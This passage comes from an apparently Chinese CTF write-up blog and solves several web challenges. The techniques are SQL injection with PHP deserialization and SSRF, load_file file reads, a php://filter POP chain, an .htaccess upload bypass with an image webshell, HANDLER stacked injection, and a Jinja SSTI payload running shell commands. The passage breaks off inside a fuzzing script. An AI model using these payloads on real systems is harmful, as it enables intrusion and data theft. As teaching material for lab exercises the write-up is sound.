punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210226110135769.png"></p><p>用御剑扫描目录发现有user.php.bak，robots.txt里面也有这个php备份文件</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210226105401195.png"></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210226105310787.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getBlogContents </span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isValidBlog </span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">blog</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里可能是利用反序化数据库中的data字段，然后取出url字段并加载，<br>所以要利用no参数进行注入，在反序列化中构造file文件协议，<br>利用<code>服务端请求伪造漏洞</code>访问服务器上的flag.php文件<br>所以接下来要做的就是将SQL语句查询结果中data字段反序列化，再将内容中的url等于flag.php即可。</p><p>构造SQL语句如下：<br>过滤了union select用<code>/ ** /</code>可以绕过</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>view<span class="token operator">.</span>php<span class="token operator">?</span>no<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token comment">/**/</span>union<span class="token comment">/**/</span>select<span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'O:8:"UserInfo":3:&#123;s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;'</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210226111759577.png" alt="base64解密即可得到flag"></p><p>在网上发现一个非常简单的解法，用到了一个load_file函数，可有直接在源码里面查看到flag</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;view.php?no&#x3D;0 union&#x2F;**&#x2F;select 1,load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;),3,4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210228154112769.png"></p><p>原因：受到secure_file_priv对文件读写的影响</p><p>secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p><ul><li>ure_file_priv的值为null ，表示限制不允许导入|导出</li><li>当secure_file_priv的值为/tmp/ ，表示限制导入|导出只能发生在/tmp/目录下</li><li>当secure_file_priv的值没有具体值时，表示不对导入|导出做限制</li></ul><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello World!"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>is_valid </code>函数来判断是否为可见字符，但 protected 类型的成员变量序列化会生成 %00，会被 false 掉。好在php7 对于类的属性不敏感，可以改用 public 类型就可以了</p><p>反序列化时首先会调用destruct()函数，destruct()会检测op值是否为‘2’，如果为‘2’就会令op=1，由于是===必须是类型和数值都等于‘2’,所以可以让op等于数字2来绕过，然后__destruct()会调用process()，process()中如果op值为2将会执行read()函数，会读取fliename的文件，所以我们需要将op=2。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$op</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210228171703585.png"></p><p>base64decode:<code>&lt;?php $flag=&#39;flag&#123;a1e1e136-3615-4545-a04c-74da6c7aa73d&#125;&#39;;</code></p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>好像上传什么都不行</p><p>这题和upload labs有题一样，是.htaccess绕过</p><blockquote><p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p></blockquote><p>.htaccess可以把.jpg文件解析成.php文件</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210228182552765.png"></p><p>再上传个图片马连上去就OK</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210228183159775.png"></p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><blockquote><p>在查询的数据不存在的情况下，联合查询会构造一个虚拟的数据</p></blockquote><p>在输错的源码页面有提示</p><p><code>&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</code></p><p>base32decode:<code>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</code></p><p>base64decode:<code>select * from user where username = &#39;$name&#39;</code></p><p>可以判断注入点在name这里，一共三个字段，通过判断可以得知name的所在的字段为<strong>2</strong>，但一般的字符会提示用户名错误，只有为admin的时候才有sql语句报错。passwd的字段应该就是<strong>3</strong>了，But,当字段3中提交的pw和表单中提交的pw一样的情况下还是会报错，试了一下把前面的pw进行MD5加密就可以了，应该是在导入数据库的时候把密码进行了MD5加密。</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210301154418343.png"></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>和那个强网杯的堆叠注入好像差不多</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210301162058010.png"></p><p>但是一些关键字被过滤了</p><p>查了一下，发现mysql有个语句没被过滤的可以查看<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">官方文档</a></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ &#123; FIRST | NEXT &#125;    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>该<code>HANDLER</code>语句提供对表存储引擎接口的直接访问。适用于 <code>InnoDB</code>和<code>MyISAM</code>表格。</p><p>该<code>HANDLER ... OPEN</code>语句将打开一个表，使其可以使用后续<code>HANDLER ... READ</code>语句进行访问。该表对象未被其他会话共享，并且在会话调用<code>HANDLER ... CLOSE</code>或会话终止之前不会关闭 。</p><p>如果使用别名打开表，则其他<code>HANDLER</code>语句对打开的表的进一步引用必须使用别名而不是表名。如果不使用别名，而是使用数据库名称限定的表名称打开表，则其他引用必须使用非限定的表名称。例如，对于使用打开的表 <code>mydb.mytable</code>，必须使用进一步的引用 <code>mytable</code>。</p></blockquote><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#payload1&#39;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p>存在XSS</p><p>根据提示发现存在ssti漏洞</p><p>payload:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cat /flag').read()"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用tplmap启动伪终端使用<code>--os-shell</code>直接查看flag</p><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>下载下来网站的备份文件发现有好几千个文件。。。每个文件里面都有一些看似可以进行RCE的参数，但大部分测试发现都是无效的。</p><p>思路就是跑脚本去一个个的测试了</p><p>自己还编写不来测试脚本，这里学习一下一位大佬编写的python脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> threading<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://127.0.0.1/src/"</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">"C://Users//Administrator//Desktop//www//src"</span><span class="token punctuation">)</span><span class="token comment">#print(files)</span><span class="token keyword">def</span> <span class="token function">GetGet</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"C://Users//Administrator//Desktop//www//src//"</span><span class="token operator">+</span><span class="token builtin">file</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">:</span><span class="token keyword">if</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$_GET['"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>start <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$_GET['"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">7</span>end <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span>start<span class="token punctuation">)</span>a<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span>start<span class="token punctuation">:</span>end<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">return</span> a<span class="token keyword">def</span> <span class="token function">GetPost</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"C://Users//Administrator//Desktop//www//src//"</span><span class="token operator">+</span><span class="token builtin">file</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">:</span><span class="token keyword">if</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$_POST['"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>start <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$_POST['"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span>end <span class="token 